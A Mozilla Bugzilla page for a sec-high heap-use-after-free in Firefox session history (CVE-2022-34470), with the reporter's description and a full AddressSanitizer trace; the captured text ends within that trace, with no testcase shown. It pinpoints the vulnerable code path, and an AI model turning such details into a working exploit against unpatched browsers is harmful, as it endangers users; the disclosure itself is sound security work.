=== Content from bugzilla.mozilla.org_a9f1922e_20250115_102741.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1765951)
* [XML](/show_bug.cgi?ctype=xml&id=1765951)

Closed
[Bug 1765951](/show_bug.cgi?id=1765951)
(CVE-2022-34470)

Opened 3 years ago
Closed 3 years ago

# heap-use-after-free in nsSHistory

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

heap-use-after-free in nsSHistory

## Categories

### (Core :: DOM: Navigation, defect, P2)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Navigation#DOM%3A%20Navigation)

DOM: Navigation
▾

Core :: DOM: Navigation
For bugs with HTML’s [navigate](https://html.spec.whatwg.org/multipage/browsing-the-web.html#navigate) algorithm and browsing contexts.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Navigation&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Navigation&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Navigation)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P2

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S2

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

103 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Score | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr91 | [102+](/buglist.cgi?f1=cf_tracking_firefox_esr91&o1=equals&v1=102%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=verified) |
| firefox101 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox101&o1=equals&v1=wontfix) |
| firefox102 | [+](/buglist.cgi?f1=cf_tracking_firefox102&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox102&o1=equals&v1=verified) |
| firefox103 | [+](/buglist.cgi?f1=cf_tracking_firefox103&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox103&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr91 | 102+ | verified |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox101 |  | wontfix |
| firefox102 | + | verified |
| firefox103 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: arminius, Assigned: peterv)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/21a031df69f8c0549475a8cdc06f53f5?d=mm&size=40)  [peterv](/user_profile?user_id=24295)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/3cca6b6cc3855653ab1b17e9df3aa8e1?d=mm&size=40)  [arminius](/user_profile?user_id=526160)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/b89a42ca4c4d59c27f33c399bb1ecc7b?d=mm&size=40)  [farre](/user_profile?user_id=566192)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

12 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2022-38472](/show_bug.cgi?id=1769155 "RESOLVED FIXED - XSLT error handler may set up error document in incorrect context")

## Details

### (Keywords: csectype-uaf, reporter-external, sec-high, Whiteboard: [STR in comment 8][adv-main102+][adv-esr91.11+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2022-34470

[Keywords:](/describekeywords.cgi)

[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[STR in comment 8][adv-main102+][adv-esr91.11+]

QA Whiteboard:

[qa-triaged]

Has STR:

yes

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a4613671_1689 "3 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files)

| [Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!](/attachment.cgi?id=9276277)  [3 years ago](#c7)  [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)   48 bytes, text/x-phabricator-request | pascalc : [approval-mozilla-beta+](#c22 "3 years ago")  tjr : [sec-approval+](#c14 "3 years ago") | [Details](/attachment.cgi?id=9276277&action=edit) | [Review](/attachment.cgi?id=9276277) |
| --- | --- | --- |
| [Bug 1765951 - Stop storing BC pointer in nsSHistory. r=smaug](/attachment.cgi?id=9280409)  [3 years ago](#c17)  [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)   48 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-esr91+](#c24 "3 years ago") | [Details](/attachment.cgi?id=9280409&action=edit) | [Review](/attachment.cgi?id=9280409) |
| [advisory.txt](/attachment.cgi?id=9282644)  [3 years ago](#c28)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   147 bytes, text/plain |  | [Details](/attachment.cgi?id=9282644&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Armin Ebert [:arminius]](/user_profile?user_id=526160)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1765951#c0)• 3 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1765951&comment_id=15868838 "1 revision") |
|  | |

Particular history navigation may cause a heap-use-after-free due to the (root) session history dereferencing a dead BC.

~~I suspect the issue is connected to how an error representation replaces the active document when a transformation via an XSLT sheet fails.~~

*Edit: The XSLT issue was in fact unconnected to the UAF and moved to a different bug.*

The ASAN reports below show a UAF on a local nightly build with *fission disabled*, and on ESR 91.9 with default settings. (There's still buggy behavior *with* fission, but I can't tell yet if there are similar potential consequences given the right testcase.)

1. local mozilla-central build rev `fb7973567fac` with `--disable-fission`:

```
==659463==ERROR: AddressSanitizer: heap-use-after-free on address 0x61a00020d420 at pc 0x7fe868ccdde9 bp 0x7fffec58b020 sp 0x7fffec58b018
READ of size 8 at 0x61a00020d420 thread T0
    #0 0x7fe868ccdde8 in get /m-c/obj-asan/dist/include/mozilla/RefPtr.h:286:27
    #1 0x7fe868ccdde8 in operator mozilla::dom::WindowContext * /m-c/obj-asan/dist/include/mozilla/RefPtr.h:299:12
    #2 0x7fe868ccdde8 in Children /m-c/docshell/base/BrowsingContext.cpp:1031:32
    #3 0x7fe868ccdde8 in mozilla::dom::BrowsingContext::GetChildren(nsTArray<RefPtr<mozilla::dom::BrowsingContext> >&) /m-c/docshell/base/BrowsingContext.cpp:1039:28
    #4 0x7fe868ec22fe in nsSHistory::LoadDifferingEntries(nsISHEntry*, nsISHEntry*, mozilla::dom::BrowsingContext*, long, nsTArray<nsSHistory::LoadEntryResult>&, bool, bool, int) /m-c/docshell/shistory/nsSHistory.cpp:2165:12
    #5 0x7fe868eba169 in nsSHistory::LoadEntry(int, long, unsigned int, nsTArray<nsSHistory::LoadEntryResult>&, bool, bool, bool) /m-c/docshell/shistory/nsSHistory.cpp:2123:26
    #6 0x7fe868ec0761 in GotoIndex /m-c/docshell/shistory/nsSHistory.cpp:2005:10
    #7 0x7fe868ec0761 in nsSHistory::GotoIndex(int, bool) /m-c/docshell/shistory/nsSHistory.cpp:1985:17
    #8 0x7fe868e83390 in mozilla::dom::ChildSHistory::GotoIndex(int, int, bool, bool, mozilla::ErrorResult&) /m-c/docshell/shistory/ChildSHistory.cpp:219:21
    #9 0x7fe868e82b8f in mozilla::dom::ChildSHistory::Go(int, bool, bool, mozilla::ErrorResult&) /m-c/docshell/shistory/ChildSHistory.cpp:167:3
    #10 0x7fe868d1cbdb in nsDocShell::GoBack(bool, bool) /m-c/docshell/base/nsDocShell.cpp:3400:11
    #11 0x7fe85a97ffd5 in NS_InvokeByIndex /m-c/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:101
    #12 0x7fe85c5d3b52 in Invoke /m-c/js/xpconnect/src/XPCWrappedNative.cpp:1626:10
    #13 0x7fe85c5d3b52 in Call /m-c/js/xpconnect/src/XPCWrappedNative.cpp:1179:19
    #14 0x7fe85c5d3b52 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /m-c/js/xpconnect/src/XPCWrappedNative.cpp:1125:23
    #15 0x7fe85c5d9985 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /m-c/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:963:10
    #16 0x7fe86a2d920f in CallJSNative /m-c/js/src/vm/Interpreter.cpp:420:13
    #17 0x7fe86a2d920f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /m-c/js/src/vm/Interpreter.cpp:507:12
    #18 0x7fe86a2c4dc8 in CallFromStack /m-c/js/src/vm/Interpreter.cpp:571:10
    #19 0x7fe86a2c4dc8 in Interpret(JSContext*, js::RunState&) /m-c/js/src/vm/Interpreter.cpp:3293:16
    #20 0x7fe86a2af6f8 in js::RunScript(JSContext*, js::RunState&) /m-c/js/src/vm/Interpreter.cpp:389:13
    #21 0x7fe86a2d9470 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /m-c/js/src/vm/Interpreter.cpp:539:13
    #22 0x7fe86a2dbbc5 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>, js::CallReason) /m-c/js/src/vm/Interpreter.cpp:584:8
    #23 0x7fe86a409180 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /m-c/js/src/vm/CallAndConstruct.cpp:117:10
    #24 0x7fe86021864c in mozilla::dom::EventHandlerNonNull::Call(mozilla::dom::BindingCallContext&, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /m-c/obj-asan/dom/bindings/EventHandlerBinding.cpp:283:37
    #25 0x7fe861444140 in Call<nsCOMPtr<mozilla::dom::EventTarget> > /m-c/obj-asan/dist/include/mozilla/dom/EventHandlerBinding.h:365:12
    #26 0x7fe861444140 in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /m-c/dom/events/JSEventHandler.cpp:201:12
    #27 0x7fe8613fc006 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /m-c/dom/events/EventListenerManager.cpp:1316:22
    #28 0x7fe8613fe005 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /m-c/dom/events/EventListenerManager.cpp:1507:17
    #29 0x7fe8614568ce in HandleEvent /m-c/dom/events/EventListenerManager.h:395:5
    #30 0x7fe8614568ce in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /m-c/dom/events/EventDispatcher.cpp:348:17
    #31 0x7fe8613e4e98 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /m-c/dom/events/EventDispatcher.cpp:550:16
    #32 0x7fe8613ea74d in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /m-c/dom/events/EventDispatcher.cpp:1119:11
    #33 0x7fe8613f0b99 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*) /m-c/dom/events/EventDispatcher.cpp
    #34 0x7fe85e1c15aa in nsINode::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /m-c/dom/base/nsINode.cpp:1354:17
    #35 0x7fe86140f663 in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&, mozilla::ErrorResult&) /m-c/dom/events/EventTarget.cpp:186:13
    #36 0x7fe85dac74d9 in nsContentUtils::DispatchXULCommand(nsIContent*, bool, mozilla::dom::Event*, mozilla::PresShell*, bool, bool, bool, bool, unsigned short, short) /m-c/dom/base/nsContentUtils.cpp:6351:12
    #37 0x7fe863f70da4 in nsXULElement::DispatchXULCommand(mozilla::EventChainVisitor const&, nsTAutoStringN<char16_t, 64ul>&) /m-c/dom/xul/nsXULElement.cpp:935:5
    #38 0x7fe863f71616 in nsXULElement::PreHandleEvent(mozilla::EventChainVisitor&) /m-c/dom/xul/nsXULElement.cpp:983:12
    #39 0x7fe8613e8e66 in PreHandleEvent /m-c/dom/events/EventDispatcher.cpp:436:22
    #40 0x7fe8613e8e66 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /m-c/dom/events/EventDispatcher.cpp:921:16
    #41 0x7fe8613f0b99 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*) /m-c/dom/events/EventDispatcher.cpp
    #42 0x7fe85e1c15aa in nsINode::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /m-c/dom/base/nsINode.cpp:1354:17
    #43 0x7fe86027a6bb in mozilla::dom::EventTarget_Binding::dispatchEvent(JSContext*, JS::Handle<JSObject*>, void*, JSJitMethodCallArgs const&) /m-c/obj-asan/dom/bindings/EventTargetBinding.cpp:851:36
    #44 0x7fe860840149 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::MaybeCrossOriginObjectThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /m-c/dom/bindings/BindingUtils.cpp:3270:13
    #45 0x7fe86a2d920f in CallJSNative /m-c/js/src/vm/Interpreter.cpp:420:13
    #46 0x7fe86a2d920f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /m-c/js/src/vm/Interpreter.cpp:507:12
    #47 0x7fe86b4c8032 in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICFallbackStub*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /m-c/js/src/jit/BaselineIC.cpp:1582:10
    #48 0x15d0e33eddc7  (<unknown module>)
0x61a00020d420 is located 928 bytes inside of 1368-byte region [0x61a00020d080,0x61a00020d5d8)
freed by thread T0 here:
    #0 0x55c9e7e4a862 in free /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:111:3
    #1 0x7fe85a72b473 in MaybeKillObject /m-c/xpcom/base/nsCycleCollector.cpp:2419:29
    #2 0x7fe85a72b473 in SnowWhiteKiller::Visit(nsPurpleBuffer&, nsPurpleBufferEntry*) /m-c/xpcom/base/nsCycleCollector.cpp:2444:9
    #3 0x7fe85a716d55 in void nsPurpleBuffer::VisitEntries<SnowWhiteKiller>(SnowWhiteKiller&) /m-c/xpcom/base/nsCycleCollector.cpp:939:23
    #4 0x7fe85a6fb438 in nsCycleCollector::FreeSnowWhiteWithBudget(js::SliceBudget&) /m-c/xpcom/base/nsCycleCollector.cpp:2612:14
    #5 0x7fe85c595002 in AsyncFreeSnowWhite::Run() /m-c/js/xpconnect/src/XPCJSRuntime.cpp:150:9
    #6 0x7fe85a9493d9 in IdleRunnableWrapper::Run() /m-c/xpcom/threads/nsThreadUtils.cpp:309:22
    #7 0x7fe85a94b600 in mozilla::RunnableTask::Run() /m-c/xpcom/threads/TaskController.cpp:467:16
    #8 0x7fe85a900483 in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /m-c/xpcom/threads/TaskController.cpp:780:26
    #9 0x7fe85a8fd1f5 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /m-c/xpcom/threads/TaskController.cpp:654:15
    #10 0x7fe85a8fd5ef in mozilla::TaskController::ProcessPendingMTTask(bool) /m-c/xpcom/threads/TaskController.cpp:390:36
    #11 0x7fe85a93d9f1 in operator() /m-c/xpcom/threads/TaskController.cpp:124:37
    #12 0x7fe85a93d9f1 in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_0>::Run() /m-c/obj-asan/dist/include/nsThreadUtils.h:531:5
    #13 0x7fe85a924517 in nsThread::ProcessNextEvent(bool, bool*) /m-c/xpcom/threads/nsThread.cpp:1180:16
    #14 0x7fe85a92f4f1 in NS_ProcessNextEvent(nsIThread*, bool) /m-c/xpcom/threads/nsThreadUtils.cpp:465:10
    #15 0x7fe85c275ba6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /m-c/ipc/glue/MessagePump.cpp:85:21
    #16 0x7fe85c0c96b2 in RunInternal /m-c/ipc/chromium/src/base/message_loop.cc:380:10
    #17 0x7fe85c0c96b2 in RunHandler /m-c/ipc/chromium/src/base/message_loop.cc:373:3
    #18 0x7fe85c0c96b2 in MessageLoop::Run() /m-c/ipc/chromium/src/base/message_loop.cc:355:3
    #19 0x7fe86470715a in nsBaseAppShell::Run() /m-c/widget/nsBaseAppShell.cpp:137:27
    #20 0x7fe869c33ca9 in nsAppStartup::Run() /m-c/toolkit/components/startup/nsAppStartup.cpp:295:30
    #21 0x7fe869ef16ad in XREMain::XRE_mainRun() /m-c/toolkit/xre/nsAppRunner.cpp:5746:22
    #22 0x7fe869ef36ef in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /m-c/toolkit/xre/nsAppRunner.cpp:5931:8
    #23 0x7fe869ef46a0 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /m-c/toolkit/xre/nsAppRunner.cpp:5998:21
    #24 0x55c9e7e7fc47 in do_main /m-c/browser/app/nsBrowserApp.cpp:225:22
    #25 0x55c9e7e7fc47 in main /m-c/browser/app/nsBrowserApp.cpp:395:16
    #26 0x7fe875aea30f in __libc_start_call_main libc-start.c

previously allocated by thread T0 here:
    #0 0x55c9e7e4aacd in malloc /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:129:3
    #1 0x55c9e7e840bd in moz_xmalloc /m-c/memory/mozalloc/mozalloc.cpp:52:15
    #2 0x7fe868cbe1d6 in operator new /m-c/obj-asan/dist/include/mozilla/cxxalloc.h:33:10
    #3 0x7fe868cbe1d6 in mozilla::dom::BrowsingContext::CreateDetached(nsGlobalWindowInner*, mozilla::dom::BrowsingContext*, mozilla::dom::BrowsingContextGroup*, nsTSubstring<char16_t> const&, mozilla::dom::BrowsingContext::Type, bool, bool) /m-c/docshell/base/BrowsingContext.cpp:431:15
    #4 0x7fe85e15721c in CreateBrowsingContext(mozilla::dom::Element*, nsIOpenWindowInfo*, mozilla::dom::BrowsingContextGroup*, bool) /m-c/dom/base/nsFrameLoader.cpp
    #5 0x7fe85e15765a in nsFrameLoader::Recreate(mozilla::dom::Element*, mozilla::dom::BrowsingContext*, mozilla::dom::BrowsingContextGroup*, mozilla::dom::NavigationIsolationOptions const&, bool, bool, bool) /m-c/dom/base/nsFrameLoader.cpp:496:15
    #6 0x7fe85e17d264 in nsFrameLoaderOwner::ChangeRemotenessCommon(nsFrameLoaderOwner::ChangeRemotenessContextType const&, mozilla::dom::NavigationIsolationOptions const&, bool, bool, mozilla::dom::BrowsingContextGroup*, std::function<void ()>&, mozilla::ErrorResult&) /m-c/dom/base/nsFrameLoaderOwner.cpp:168:20
    #7 0x7fe85e17eb84 in nsFrameLoaderOwner::ChangeRemoteness(mozilla::dom::RemotenessOptions const&, mozilla::ErrorResult&) /m-c/dom/base/nsFrameLoaderOwner.cpp:272:3
    #8 0x7fe85fe20e9d in mozilla::dom::XULFrameElement_Binding::changeRemoteness(JSContext*, JS::Handle<JSObject*>, void*, JSJitMethodCallArgs const&) /m-c/obj-asan/dom/bindings/XULFrameElementBinding.cpp:517:24
    #9 0x7fe86083bf12 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /m-c/dom/bindings/BindingUtils.cpp:3270:13
    #10 0x7fe86a2d920f in CallJSNative /m-c/js/src/vm/Interpreter.cpp:420:13
    #11 0x7fe86a2d920f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /m-c/js/src/vm/Interpreter.cpp:507:12
    #12 0x7fe86a2c4dc8 in CallFromStack /m-c/js/src/vm/Interpreter.cpp:571:10
    #13 0x7fe86a2c4dc8 in Interpret(JSContext*, js::RunState&) /m-c/js/src/vm/Interpreter.cpp:3293:16
    #14 0x7fe86a2af6f8 in js::RunScript(JSContext*, js::RunState&) /m-c/js/src/vm/Interpreter.cpp:389:13
    #15 0x7fe86a2d9470 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /m-c/js/src/vm/Interpreter.cpp:539:13
    #16 0x7fe86a2dbbc5 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>, js::CallReason) /m-c/js/src/vm/Interpreter.cpp:584:8
    #17 0x7fe86a406e5e in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /m-c/js/src/vm/CallAndConstruct.cpp:53:10
    #18 0x7fe85c5c2b9f in nsXPCWrappedJS::CallMethod(unsigned short, nsXPTMethodInfo const*, nsXPTCMiniVariant*) /m-c/js/xpconnect/src/XPCWrappedJSClass.cpp:981:17
    #19 0x7fe85a98160c in PrepareAndDispatch /m-c/xpcom/reflect/xptcall/md/unix/xptcstubs_x86_64_linux.cpp:115:37
    #20 0x7fe85a98052a in SharedStub xptcstubs_x86_64_linux.cpp
    #21 0x7fe85a78bbe0 in nsObserverList::NotifyObservers(nsISupports*, char const*, char16_t const*) /m-c/xpcom/ds/nsObserverList.cpp:70:19
    #22 0x7fe85a7bb0b0 in nsObserverService::NotifyObservers(nsISupports*, char const*, char16_t const*) /m-c/xpcom/ds/nsObserverService.cpp:292:19
    #23 0x7fe86371b9fa in mozilla::dom::ContentParent::ActorDestroy(mozilla::ipc::IProtocol::ActorDestroyReason) /m-c/dom/ipc/ContentParent.cpp:2062:10
    #24 0x7fe85c2ae763 in mozilla::ipc::IProtocol::DestroySubtree(mozilla::ipc::IProtocol::ActorDestroyReason) /m-c/ipc/glue/ProtocolUtils.cpp:577:3
    #25 0x7fe863a173a2 in mozilla::dom::PContentParent::OnChannelError() /m-c/obj-asan/ipc/ipdl/PContentParent.cpp:16719:5
    #26 0x7fe86371a035 in mozilla::dom::ContentParent::OnChannelError() /m-c/dom/ipc/ContentParent.cpp:1949:19
    #27 0x7fe85c26fff4 in mozilla::ipc::MessageChannel::OnNotifyMaybeChannelError() /m-c/ipc/glue/MessageChannel.cpp:1982:3
    #28 0x7fe85c2a3d7f in applyImpl<mozilla::ipc::MessageChannel, void (mozilla::ipc::MessageChannel::*)()> /m-c/obj-asan/dist/include/nsThreadUtils.h:1147:12
    #29 0x7fe85c2a3d7f in apply<mozilla::ipc::MessageChannel, void (mozilla::ipc::MessageChannel::*)()> /m-c/obj-asan/dist/include/nsThreadUtils.h:1153:12
    #30 0x7fe85c2a3d7f in mozilla::detail::RunnableMethodImpl<mozilla::ipc::MessageChannel*, void (mozilla::ipc::MessageChannel::*)(), false, (mozilla::RunnableKind)1>::Run() /m-c/obj-asan/dist/include/nsThreadUtils.h:1200:13
    #31 0x7fe85a94b600 in mozilla::RunnableTask::Run() /m-c/xpcom/threads/TaskController.cpp:467:16
    #32 0x7fe85a900483 in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /m-c/xpcom/threads/TaskController.cpp:780:26
    #33 0x7fe85a8fced8 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /m-c/xpcom/threads/TaskController.cpp:612:15
    #34 0x7fe85a8fd5ef in mozilla::TaskController::ProcessPendingMTTask(bool) /m-c/xpcom/threads/TaskController.cpp:390:36

SUMMARY: AddressSanitizer: heap-use-after-free /m-c/obj-asan/dist/include/mozilla/RefPtr.h:286:27 in get
Shadow bytes around the buggy address:
  0x0c3480039a30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480039a40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480039a50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480039a60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480039a70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c3480039a80: fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd
  0x0c3480039a90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
